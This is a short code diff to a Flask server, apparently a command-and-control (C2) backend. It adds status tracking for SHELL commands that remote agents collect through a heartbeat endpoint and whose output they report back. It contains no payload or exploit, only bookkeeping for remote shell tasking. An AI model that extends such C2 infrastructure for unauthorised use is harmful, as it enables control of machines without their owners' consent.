@@ -86,6 +86,14 @@ def heartbeat():
         pending = json.loads(agent.pending_command)
         agent.pending_command = None
         agent.pending_command_time = None
+        
+        # O agente buscou o comando, mudamos o status para EXECUTING
+        # desde que seja um comando SHELL
+        if pending.get("command") == "SHELL":
+            extra_d = json.loads(agent.extra_data or "{}")
+            if extra_d.get("cmd_status") == "SENT":
+                extra_d["cmd_status"] = "EXECUTING"
+                agent.extra_data = json.dumps(extra_d)
 
     db.session.commit()
     return jsonify({"status": "ok", "agent_id": agent.id, "pending_command": pending})
@@ -204,6 +212,13 @@ def command_output():
     }
     agent.command_result = json.dumps(result)
     agent.command_result_time = datetime.utcnow()
+    
+    # Atualizar o status para COMPLETED se houver um command tracker
+    extra_d = json.loads(agent.extra_data or "{}")
+    if extra_d.get("cmd_status") in ["SENT", "EXECUTING"]:
+        extra_d["cmd_status"] = "COMPLETED"
+        agent.extra_data = json.dumps(extra_d)
+        
     db.session.commit()
     log.info(f"[C2] Output recebido de {agent.hostname}: {result['command'][:60]}")
     return jsonify({"status": "ok"})
